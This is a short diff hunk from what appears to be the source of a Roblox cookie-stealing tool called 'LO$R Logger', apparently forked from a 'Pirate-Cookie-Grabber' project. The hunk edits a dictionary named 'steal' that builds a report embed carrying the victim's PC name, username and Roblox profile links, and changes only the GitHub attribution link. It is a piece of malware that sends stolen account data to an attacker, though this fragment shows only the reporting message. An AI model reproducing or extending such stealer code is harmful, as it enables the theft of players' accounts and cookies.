@@ -746,7 +746,7 @@ steal = {
             "author": {
                 "name": "LO$R Logger",
             },
-            "description": f"{pc} tried nuking someone \n\n[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "description": f"{pc} tried nuking someone \n\n[https://github.com/madhead341/LOSR-Logger](https://github.com/madhead341/LOSR-Logger) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color": 0x00C7FF,
             "fields": [
                 {"name": "Username", "value": User, "inline": True},
